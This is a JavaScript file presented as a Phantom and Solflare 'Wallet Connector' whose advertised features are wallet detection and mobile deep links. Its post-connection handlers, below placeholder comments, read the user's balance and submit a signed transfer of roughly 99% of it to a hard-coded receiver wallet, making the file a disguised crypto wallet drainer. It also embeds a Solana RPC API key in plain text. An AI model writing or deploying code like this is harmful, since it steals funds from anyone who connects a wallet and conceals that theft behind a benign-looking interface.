/* ---------------------------------------------------------
    Wallet Connector
    Supports: Phantom & Solflare
    Features:
    - Detect installed wallet
    - Detect mobile vs desktop
    - Deep-link to wallet apps on mobile
    - Open wallet-specific function handler
--------------------------------------------------------- */

// ===== DEVICE CHECKER =====
function isMobile() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

// ===== WALLET DETECTION =====
function detectWallet() {
    const hasPhantom = window.solana && window.solana.isPhantom;
    const hasSolflare = window.solflare;

    return { hasPhantom, hasSolflare };
}

// ===== DEEP LINKS FOR MOBILE USERS =====
// (Used when wallet extension isn't available)
const MOBILE_LINKS = {
    phantom: "https://phantom.app/ul/browse/",
    solflare: "https://solflare.com/ul/v1/login/"
};

// ===== MAIN CONNECT FUNCTION =====
async function connectWallet(walletName) {
    const { hasPhantom, hasSolflare } = detectWallet();
    const mobile = isMobile();

    switch (walletName) {
        case "phantom":
            return connectPhantom(hasPhantom, mobile);

        case "solflare":
            return connectSolflare(hasSolflare, mobile);

        default:
            alert("Unknown wallet:", walletName);
            return;
    }
}

/* ---------------------------------------------------------
    PHANTOM
--------------------------------------------------------- */
async function connectPhantom(isInstalled, mobile) {
    alert("Attempting Phantom connection...");

    if (!isInstalled) {
        // Mobile users get Phantom App deep-link
        if (mobile) {
            window.location.href = MOBILE_LINKS.phantom;
            return;
        }

        alert("Phantom wallet not found on this device.");
        return;
    }

    try {
        // Desktop: connect through extension
        const resp = await window.solana.connect();
        alert("Phantom Connected:", resp.publicKey.toString());

        onPhantomConnected(resp.publicKey);
    } catch (err) {
        alert("Phantom connection cancelled or failed:", + err);
    }
}

/* ---------------------------------------------------------
    SOLFLARE
--------------------------------------------------------- */
async function connectSolflare(isInstalled, mobile) {
    alert("Attempting Solflare connection...");

    if (!isInstalled) {
        // Mobile deep link
        if (mobile) {
            window.location.href = MOBILE_LINKS.solflare;
            return;
        }

        alert("Solflare wallet not found on this device.");
        return;
    }

    try {
        // Desktop: Solflare extension connect
        const solflare = window.solflare;

        await solflare.connect();
        const pubkey = solflare.publicKey.toString();

        alert("Solflare Connected:", pubkey);

        onSolflareConnected(solflare.publicKey);
    } catch (err) {
        alert("Solflare connection failed:", +err);
    }
}

/* ---------------------------------------------------------
    CALLBACK FUNCTIONS (Fired after successful connection)
--------------------------------------------------------- */

// What to run when Phantom connects
function onPhantomConnected(publicKey) {
    alert("Phantom handler running...");
    // Write your code here
    // Example:
    // fetchUserBalance(publicKey);
    connectToPhantomWallet(publicKey);

}

// What to run when Solflare connects
function onSolflareConnected(publicKey) {
    alert("Solflare handler running...");
    // Write your code here
    // Example:
    // loadDashboard(publicKey);
    connectToSolflareWallet(publicKey);
}


async function connectToPhantomWallet(publicKey) {
    
            try {
                const resp = await window.solana.connect();
                alert("Phantom Wallet connected:", resp);

                var connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H', 
                    'confirmed'
                );

                const public_key = new solanaWeb3.PublicKey(publicKey);
                const walletBalance = await connection.getBalance(public_key);
                alert("Wallet balance: " + walletBalance ) ;

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

                 
                    try {
                        const recieverWallet = new solanaWeb3.PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        var transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: resp.publicKey,
                                toPubkey: recieverWallet,
                                lamports: Math.floor(balanceForTransfer * 0.99),
                            }),
                        );

                        transaction.feePayer = window.solana.publicKey;
                        let blockhashObj = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        const signed = await window.solana.signTransaction(transaction);
                        alert("Transaction signed:", signed);

                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        alert("Transaction confirmed:", txid);
                    } catch (err) {
                        alert("Error during transaction:", err);
                    }
                




            } catch (err) {
                alert("Error connecting to Phantom Wallet:", err);
            }
        }
        

async function connectToSolflareWallet() {
    alert("Solflare connection function called.");
    // Implement Solflare-specific connection logic here
 const resp = await window.solflare.connect();
 alert("Solflare Wallet connected:", resp);
 var connection = new solanaWeb3.Connection(
     'https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H', 
     'confirmed'
 );

 const public_key = new solanaWeb3.PublicKey(resp.publicKey);
 const walletBalance = await connection.getBalance(public_key);
 alert("Wallet balance: " + walletBalance ) ;

 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
 if (walletBalance < minBalance) {
     alert("Insufficient funds for rent.");
     return;
 }

  
     try {
         const recieverWallet = new solanaWeb3.PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
         const balanceForTransfer = walletBalance - minBalance;
         if (balanceForTransfer <= 0) {
             alert("Insufficient funds for transfer.");
             return;
         }

         var transaction = new solanaWeb3.Transaction().add(
             solanaWeb3.SystemProgram.transfer({
                 fromPubkey: resp.publicKey,
                 toPubkey: recieverWallet,
                 lamports: Math.floor(balanceForTransfer * 0.99),
             }),
         );             
            transaction.feePayer = window.solflare.publicKey;
            let blockhashObj = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhashObj.blockhash;

         const signed = await window.solflare.signTransaction(transaction);
         alert("Transaction signed:", signed);

         let txid = await connection.sendRawTransaction(signed.serialize());
         await connection.confirmTransaction(txid);
         alert("Transaction confirmed:", txid);
     } catch (err) {
         alert("Error during transaction:", err);
     }      


}


/* ---------------------------------------------------------
    EXPORT (optional)
--------------------------------------------------------- */

window.walletConnector = {
    connectWallet
};



